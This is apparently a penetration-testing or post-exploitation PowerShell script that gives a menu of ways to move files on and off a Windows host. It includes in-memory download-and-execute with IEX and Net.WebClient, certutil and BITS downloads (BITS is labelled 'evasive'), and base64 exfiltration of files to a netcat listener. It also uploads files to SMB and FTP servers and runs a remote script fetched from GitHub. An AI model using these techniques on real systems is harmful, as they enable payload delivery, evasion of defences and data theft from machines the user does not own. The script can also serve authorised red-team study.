Write-Host "Choose an operation:
1) File download
2) File upload
"
$choiceOp = Read-Host "Option"

if ($choiceOp -eq 1) {
    Write-Host "Choose a method:
    1) Decode base64 data
    2) Get contents without downloading
    3) Get contents without downloading and execute
    4) Download file to current directory
    5) File download using certutil.exe
    6) File download using BITS (evasive)
    7) Download file from SMB server
    8) Download file from FTP server
    "
    $method = Read-Host "Option"
    
    if ($method -eq 1) {
        $string = Read-Host "Data [File/String]"
        if (Test-Path -Path $string -PathType Leaf) {
            $contents = Get-Content -Path $string -Raw
            $byteArray = [Convert]::FromBase64String($contents)
            $decodedB64 = [Text.Encoding]::UTF8.GetString($byteArray)
            $choice = Read-Host "Would you like to output the result to a file? [Y/N]"
            if ($choice.ToLower() -eq "y") {
                $decodedB64 | Out-File "base64Decoded.txt"
                Write-Host "Saved as base64Decoded.txt"
            } else {
                Write-Host $decodedB64
            }
        } else {
            $byteArray = [Convert]::FromBase64String($string)
            $decodedB64 = [Text.Encoding]::UTF8.GetString($byteArray)
            $choice = Read-Host "Would you like to output the result to a file? [Y/N]"
            if ($choice.ToLower() -eq "y") {
                $decodedB64 | Out-File "base64Decoded.txt"
                Write-Host "Saved as base64Decoded.txt"
            } else {
                Write-Host $decodedB64
            }   
        } 
    } elseif ($method -eq 2) {
        $website = Read-Host "Link"
        try {
            (New-Object Net.WebClient).downloadString($website)
        } catch {
            Write-Host "Enter a valid link. Ensure that the link is up and running."
        }
    } elseif ($method -eq 3) {
        $website = Read-Host "Link"
        try {
            IEX((New-Object Net.WebClient).downloadString($website))
        } catch {
            Write-Host "Enter a valid link. Ensure that the link is up and running."
        }
    } elseif ($method -eq 4) {
        $website = Read-Host "Link"
        try {
            Invoke-WebRequest -Uri $website -OutFile "output.txt"
            Write-Host "Saved as output.txt"
        } catch {
            Write-Host "Enter a valid link. Ensure that the link is up and running."
        }
    } elseif ($method -eq 5) {
        $website = Read-Host "Link"
        try {
            certutil.exe -urlcache -f $website output.txt
            Write-Host "Saved as output.txt"
        } catch {
            Write-Host "Enter a valid link. Ensure that the link is up and running."
        }
    } elseif ($method -eq 6) {
        $website = Read-Host "Link"
        try {
            Start-BitsTransfer -Source $website -Destination "output.txt" 
            Write-Host "Saved as output.txt"
        } catch {
            Write-Host "Enter a valid link. Ensure that the link is up and running."
        }
    } elseif ($method -eq 7) {
        Write-Host "Make sure you have an SMB server running. You can do this using impacket's smbserver python script:"
        Write-Host "'sudo smbserver.py -smb2support share <foldername>'"
        Write-Host ""
        $server = Read-Host "Enter SMB server address"
        $share = Read-Host "Enter share name"
        $file = Read-Host "Name of the file to be downloaded"
        $location = "\\" + $server + "\" + $share + "\" + $file
        try {
            copy $location
        } catch {
            Write-Host "Something went wrong. Ensure all parameters are correct."
        }
    } elseif ($method -eq 8) {
        Write-Host "Make sure you have an FTP server running. You can do this using python's pyftpdlib module:"
        Write-Host "'sudo python3 -m pyftpdlib -p 21'"
        Write-Host ""
        $server = Read-Host "Enter FTP server address"
        $file = Read-Host "Name of the file to be downloaded"
        $location = "ftp://" + $server + "/" + $file
        try {
            Invoke-WebRequest $location -OutFile output.txt
            Write-Host "Saved as output.txt"
        } catch {
            Write-Host "Something went wrong. Ensure all parameters are correct."
        }
    }
}

if ($choiceOp -eq 2) {
    Write-Host "Choose a method:
    1) Encode file in base64 and upload to a webserver
    2) Upload file to python upload server (requires an internet connection)
    3) Upload file to SMB server
    4) Upload file to FTP server
    "

    $method = Read-Host "Option"
    if ($method -eq 1) {
        Write-Host "You need a netcat listener for this:"
        Write-Host "'nc -lvnp 8000'"
        Write-Host ""
        $serverPort = Read-Host "Enter webserver address (SERVER:PORT)"
        $file = Read-Host "Upload file"
        $location = "http://" + $serverPort + "/"
        try {
            $contents = Get-Content -Path $file
            $byteArray = [Text.Encoding]::UTF8.GetBytes($contents)
            $b64 = [Convert]::ToBase64String($byteArray)
            Invoke-WebRequest -Uri $location -Method POST -Body $b64
        } catch {
            Write-Host "Something went wrong. Ensure all parameters are correct."
        }
    } elseif ($method -eq 2) {
        Write-Host "You need a python upload server and an internet connection for this. You can do this using python's uploadserver module:"
        Write-Host "'python3 -m uploadserver'"
        Write-Host ""
        $serverPort = Read-Host "Enter upload server address (SERVER:PORT)"
        $file = Read-Host "Upload file"
        $location = "http://" + $serverPort + "/upload"
        try {
            IEX(New-Object Net.WebClient).downloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
            Invoke-FileUpload -Uri $location -File $file
        } catch {
            Write-Host "Something went wrong. Ensure all parameters are correct."
        }
    } elseif ($method -eq 3) {
        Write-Host "Make sure you have an SMB server running. You can do this using impacket's smbserver python script:"
        Write-Host "'smbserver.py -smb2support share <foldername>'"
        Write-Host ""
        $server = Read-Host "Enter SMB server address"
        $share = Read-Host "Enter share name"
        $file = Read-Host "Upload file"
        $location = "\\" + $server + "\" + $share
        try {
            copy $file $location
        } catch {
            Write-Host "Something went wrong. Ensure all parameters are correct."
        }
    } elseif ($method -eq 4) {
        Write-Host "Make sure you have an FTP server running. You can do this using python's pyftpdlib module:"
        Write-Host "'sudo python3 -m pyftpdlib -p 21 --write'"
        Write-Host ""
        $server = Read-Host "Enter FTP server address"
        $file = Read-Host "Upload file"
        $location = "ftp://" + $server + "/output.txt"
        try {
            (New-Object Net.WebClient).UploadFile($location, $file)
            Write-Host "Saved on remote host as output.txt"
        } catch {
            Write-Host "Something went wrong. Ensure all parameters are correct."
        }
    }
}